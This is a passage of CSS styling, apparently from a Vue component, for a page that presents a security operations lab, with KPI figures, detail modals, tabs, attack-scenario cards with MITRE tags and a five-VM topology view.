  border-right: 1px solid rgba(255, 255, 255, 0.08);
  text-align: center;
}

.soc-kpi:last-child { border-right: none; }

.soc-kpi__value {
  font-size: 28px;
  font-weight: 900;
  color: #ff7a45;
  line-height: 1;
  letter-spacing: -0.02em;
  margin-bottom: 8px;
  text-shadow: 0 0 16px rgba(233, 84, 32, 0.35);
}

.soc-kpi__label {
  font-size: 11.5px;
  font-weight: 700;
  color: rgba(255, 255, 255, 0.78);
  text-transform: uppercase;
  letter-spacing: 0.06em;
  line-height: 1.35;
}

/* ══════════════════════════════════════════════
   CTA PDF
══════════════════════════════════════════════ */
.soc-footer-cta {
  text-align: center;
  margin-top: 12px;
}

.soc-pdf-btn {
  display: inline-flex;
  align-items: center;
  gap: 9px;
  font-size: 15px;
  padding: 12px 28px;
  border-radius: 14px;
}

/* ══════════════════════════════════════════════
   MODALE DÉTAIL
══════════════════════════════════════════════ */
.soc-modal-backdrop {
  position: fixed;
  inset: 0;
  background: rgba(7, 3, 10, 0.82);
  backdrop-filter: blur(10px);
  z-index: 3000;
  display: grid;
  place-items: center;
  padding: 24px;
}

.soc-modal {
  width: 100%;
  max-width: 760px;
  max-height: 90vh;
  overflow-y: auto;
  padding: 32px;
  background: #170d1e;
  border: 1px solid rgba(233, 84, 32, 0.35);
  box-shadow: 0 24px 70px rgba(0, 0, 0, 0.8);
  border-radius: 22px;
}

.soc-modal__header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  flex-wrap: wrap;
  gap: 12px;
  margin-bottom: 20px;
}

.soc-modal__tool {
  font-size: 12px;
  font-weight: 700;
  color: #ff9d6c;
  background: rgba(233, 84, 32, 0.18);
  border: 1px solid rgba(233, 84, 32, 0.35);
  padding: 4px 12px;
  border-radius: 20px;
  font-family: 'Ubuntu Mono', monospace;
  margin-left: 10px;
}

.soc-modal__close {
  width: 38px;
  height: 38px;
  border-radius: 50%;
  display: grid;
  place-items: center;
  background: rgba(255, 255, 255, 0.08);
  border: 1px solid rgba(255, 255, 255, 0.15);
  cursor: pointer;
  color: #ffffff;
  transition: all 0.2s;
}

.soc-modal__close:hover {
  background: rgba(233, 84, 32, 0.3);
  border-color: #e95420;
}

.soc-modal__title {
  margin: 0 0 12px;
  font-size: 22px;
  font-weight: 800;
  color: #ffffff;
}

.soc-modal__desc {
  margin: 0 0 20px;
  font-size: 15px;
  line-height: 1.68;
  color: rgba(255, 255, 255, 0.85);
}

.soc-modal__details { margin-top: 22px; }

.soc-modal__details h4 {
  margin: 0 0 12px;
  font-size: 14px;
  font-weight: 800;
  color: #ff8a50;
  text-transform: uppercase;
  letter-spacing: 0.08em;
}

.soc-modal__details ul {
  margin: 0;
  padding-left: 22px;
  display: flex;
  flex-direction: column;
  gap: 8px;
}

.soc-modal__details li {
  font-size: 14.5px;
  line-height: 1.55;
  color: rgba(255, 255, 255, 0.85);
}

/* ══════════════════════════════════════════════
   TRANSITION MODALE
══════════════════════════════════════════════ */
.soc-modal-fade-enter-active,
.soc-modal-fade-leave-active {
  transition: opacity 0.3s ease;
}

.soc-modal-fade-enter-active .soc-modal,
.soc-modal-fade-leave-active .soc-modal {
  transition: transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1), opacity 0.3s ease;
}

.soc-modal-fade-enter-from,
.soc-modal-fade-leave-to {
  opacity: 0;
}

.soc-modal-fade-enter-from .soc-modal,
.soc-modal-fade-leave-to .soc-modal {
  transform: translateY(24px) scale(0.97);
  opacity: 0;
}

/* ══════════════════════════════════════════════
   ONGLETS DE NAVIGATION SOC
══════════════════════════════════════════════ */
.soc-tab-nav {
  display: flex;
  justify-content: center;
  align-items: center;
  flex-wrap: wrap;
  gap: 10px;
  max-width: 860px;
  margin: 0 auto 36px;
  padding: 8px;
  background: rgba(9, 4, 14, 0.85);
  border: 1px solid rgba(233, 84, 32, 0.28);
  border-radius: 18px;
  box-shadow: 0 8px 30px rgba(0, 0, 0, 0.5);
}

.soc-tab-btn {
  display: inline-flex;
  align-items: center;
  gap: 8px;
  padding: 10px 18px;
  border-radius: 12px;
  border: 1px solid transparent;
  background: transparent;
  color: rgba(255, 255, 255, 0.75);
  font-family: inherit;
  font-size: 13.5px;
  font-weight: 700;
  cursor: pointer;
  transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1);
}

.soc-tab-btn:hover {
  color: #ffffff;
  background: rgba(233, 84, 32, 0.15);
  border-color: rgba(233, 84, 32, 0.3);
}

.soc-tab-btn--active {
  color: #ffffff !important;
  background: linear-gradient(135deg, rgba(233, 84, 32, 0.9) 0%, rgba(168, 85, 247, 0.85) 100%) !important;
  border-color: rgba(255, 255, 255, 0.2) !important;
  box-shadow: 0 6px 20px rgba(233, 84, 32, 0.4);
}

.soc-tab-count {
  font-size: 11px;
  padding: 2px 8px;
  border-radius: 10px;
  background: rgba(255, 255, 255, 0.2);
  color: #fff;
  font-weight: 800;
}

/* ══════════════════════════════════════════════
   VUE SCÉNARIOS DE TEST (4 SCÉNARIOS)
══════════════════════════════════════════════ */
.soc-scenarios-view,
.soc-topology-view {
  max-width: 1200px;
  margin: 0 auto 56px;
  animation: modalFadeIn 0.35s ease;
}

.soc-scenarios-intro {
  text-align: center;
  max-width: 820px;
  margin: 0 auto 36px;
}

.soc-scenarios-title {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 10px;
  margin: 0 0 12px;
  font-size: 22px;
  font-weight: 900;
  color: #ffffff;
}

.soc-scenarios-desc {
  margin: 0;
  font-size: 14.5px;
  line-height: 1.65;
  color: rgba(255, 255, 255, 0.78);
}

.soc-scenarios-desc code {
  color: #ff9d6c;
  background: rgba(233, 84, 32, 0.15);
  padding: 2px 6px;
  border-radius: 6px;
  font-family: 'Ubuntu Mono', monospace;
}

.soc-scenarios-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(520px, 1fr));
  gap: 28px;
}

.soc-scenario-card {
  padding: 28px;
  display: flex;
  flex-direction: column;
  border-radius: 22px;
}

.soc-sc-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  flex-wrap: wrap;
  gap: 10px;
  margin-bottom: 16px;
}

.soc-sc-tags {
  display: flex;
  align-items: center;
  flex-wrap: wrap;
  gap: 8px;
}

.soc-sc-number {
  font-family: 'Ubuntu Mono', monospace;
  font-size: 11px;
  font-weight: 800;
  letter-spacing: 0.08em;
  color: #ff9d6c;
  background: rgba(233, 84, 32, 0.15);
  border: 1px solid rgba(233, 84, 32, 0.35);
  padding: 3px 9px;
  border-radius: 8px;
}

.mitre-tag {
  font-family: 'Ubuntu Mono', monospace;
  font-size: 11px;
  font-weight: 700;
  color: #c084fc;
  background: rgba(192, 132, 252, 0.12);
  border: 1px solid rgba(192, 132, 252, 0.35);
  padding: 3px 9px;
  border-radius: 8px;
}

.soc-sc-status {
  display: inline-flex;
  align-items: center;
  gap: 6px;
  font-size: 12px;
  font-weight: 800;
  color: #34d399;
  background: rgba(52, 211, 153, 0.15);
  border: 1px solid rgba(52, 211, 153, 0.4);
  padding: 4px 10px;
  border-radius: 20px;
}

.soc-sc-title {
  margin: 0 0 10px;
  font-size: 18px;
  font-weight: 900;
  color: #ffffff;
  line-height: 1.3;
}

.soc-sc-desc {
  margin: 0 0 18px;
  font-size: 14px;
  line-height: 1.6;
  color: rgba(255, 255, 255, 0.8);
}

.soc-sc-meta-grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 10px 14px;
  padding: 16px;
  border-radius: 14px;
  background: rgba(10, 5, 16, 0.7);
  border: 1px solid rgba(255, 255, 255, 0.08);
  margin-bottom: 18px;
}

.soc-sc-meta-item {
  display: flex;
  flex-direction: column;
  gap: 3px;
  font-size: 13px;
}

.soc-sc-meta-item.full-width {
  grid-column: 1 / -1;
}

.soc-sc-meta-label {
  font-size: 11.5px;
  font-weight: 800;
  color: rgba(255, 255, 255, 0.6);
  text-transform: uppercase;
  letter-spacing: 0.04em;
}

.soc-sc-meta-val {
  color: rgba(255, 255, 255, 0.88);
  line-height: 1.45;
}

.soc-sc-meta-val.code-text {
  font-family: 'Ubuntu Mono', monospace;
  color: #38bdf8;
  font-size: 12.5px;
}

.soc-sc-meta-val.highlight-val {
  color: #34d399;
  font-weight: 700;
}

/* ══════════════════════════════════════════════
   VUE TOPOLOGIE LAB (5 VMs)
══════════════════════════════════════════════ */
.soc-topo-diagram-card {
  padding: 24px;
  margin-bottom: 32px;
  border-radius: 20px;
}

.soc-topo-diagram-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 16px;
  margin-bottom: 16px;
}

.soc-topo-diagram-img {
  width: 100%;
  max-height: 420px;
  object-fit: contain;
  border-radius: 12px;
  background: #0d0714;
  border: 1px solid rgba(255, 255, 255, 0.1);
  cursor: zoom-in;
  transition: transform 0.3s ease;
}

.soc-topo-diagram-img:hover {
  transform: scale(1.01);
}

.soc-vms-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
  gap: 18px;
}

.soc-vm-card {
  padding: 22px;
  border-radius: 18px;
  border-top: 3px solid var(--vm-accent, #e95420);
}

.soc-vm-header {
  display: flex;
  align-items: flex-start;
  justify-content: space-between;
  gap: 10px;
  margin-bottom: 14px;
}

.soc-vm-badge {
  display: inline-block;
  font-size: 10.5px;
  font-weight: 800;
  text-transform: uppercase;
  letter-spacing: 0.08em;
  padding: 2px 8px;
  border-radius: 12px;
  border: 1px solid;
  margin-bottom: 6px;
}

.soc-vm-name {
  margin: 0;
  font-size: 16px;
  font-weight: 800;
  color: #ffffff;
  font-family: 'Ubuntu Mono', monospace;
}

.soc-vm-ip {
  font-family: 'Ubuntu Mono', monospace;
  font-size: 12.5px;
  font-weight: 700;
  color: var(--vm-accent, #ff9d6c);
  background: rgba(0, 0, 0, 0.3);
  padding: 3px 8px;
  border-radius: 6px;
  border: 1px solid rgba(255, 255, 255, 0.1);
}

.soc-vm-meta {
  display: flex;
  flex-direction: column;
  gap: 4px;
  font-size: 13px;
  color: rgba(255, 255, 255, 0.78);
  margin-bottom: 14px;
  padding-bottom: 12px;
  border-bottom: 1px solid rgba(255, 255, 255, 0.08);
}

.soc-vm-meta strong {
  color: #ffffff;
}

.soc-vm-services-title {
  display: block;
  font-size: 11px;
  font-weight: 800;
  color: rgba(255, 255, 255, 0.55);
  text-transform: uppercase;
  letter-spacing: 0.05em;
  margin-bottom: 8px;
}

.soc-vm-services ul {
  margin: 0;
  padding-left: 18px;
  display: flex;
  flex-direction: column;
  gap: 5px;
}

.soc-vm-services li {
  font-size: 12.5px;
  color: rgba(255, 255, 255, 0.85);
  font-family: 'Ubuntu Mono', monospace;
}

/* ══════════════════════════════════════════════
   RESPONSIVE
══════════════════════════════════════════════ */
@media (max-width: 820px) {
  .soc-scenarios-grid {
    grid-template-columns: 1fr;
  }
  .soc-sc-meta-grid {
    grid-template-columns: 1fr;
  }
  .soc-vms-grid {
    grid-template-columns: 1fr;
  }
  .soc-phase-row {
    grid-template-columns: 44px 1fr;
    gap: 0 16px;
    margin-bottom: 40px;
  }

  .soc-center-line {
    left: 22px;
    transform: none;
  }

  .soc-phase-row.phase-row--left .soc-phase-side--empty,
  .soc-phase-row.phase-row--right .soc-phase-side--empty {
    display: none;
  }

  .soc-phase-row.phase-row--left,
  .soc-phase-row.phase-row--right {
    grid-template-columns: 44px 1fr;
  }

  .soc-phase-row.phase-row--left .soc-phase-center  { order: 1; }
  .soc-phase-row.phase-row--left .soc-phase-side--content { order: 2; padding-right: 0; }
  .soc-phase-row.phase-row--right .soc-phase-center { order: 1; }
  .soc-phase-row.phase-row--right .soc-phase-side--content { order: 2; padding-left: 0; }

  .soc-phase-marker { width: 42px; height: 42px; }

  .soc-results-band { flex-wrap: wrap; }
  .soc-kpi { min-width: 45%; border-bottom: 1px solid rgba(255,255,255,0.08); }
}
</style>
